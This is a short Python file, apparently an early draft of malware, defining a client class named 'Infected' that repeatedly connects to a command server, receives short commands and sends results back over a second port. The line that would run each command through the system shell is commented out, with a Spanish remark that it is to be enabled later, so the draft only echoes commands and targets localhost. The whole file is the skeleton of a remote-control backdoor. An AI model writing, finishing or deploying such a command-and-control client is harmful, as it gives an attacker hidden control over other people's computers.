import socket
from time import sleep
import os

class Infected:

    def __init__(self, ip, portReceiveCommand, portSendOutput):
        self.ipServer = ip
        self.portReceiveCommand = portReceiveCommand
        self.portSendOutput = portSendOutput
        self.lastAction = None
        
    def getDataFromSocket(self, socket):
        return socket.recv(16).decode("utf-8")
                
    def listenForAction(self):
        while True:
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            # Connect the socket to the port where the server is listening
            server_address = (self.ipServer, self.portReceiveCommand)
            sock.connect(server_address)            
            try:
                # Receive action
                action = self.getDataFromSocket(sock)                
            finally:
                sock.close()
            
            if action != self.lastAction:
                self.lastAction = action
                self.executeAction(action)
                
            else:
                sleep(10)
    
    def executeAction(self, action):
        print(action)
        #output = os.system(action)        
        self.sendOutput(action) # se cambia por output mas adelante
    
    def sendOutput(self, output):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        server_address = (self.ipServer, self.portSendOutput)
        sock.connect(server_address)
        try:
            # Receive action
            sock.sendall(bytes(output,"utf-8"))                
        finally:
            sock.close()       
            
inf = Infected("localhost", 10000, 10001)
inf.listenForAction()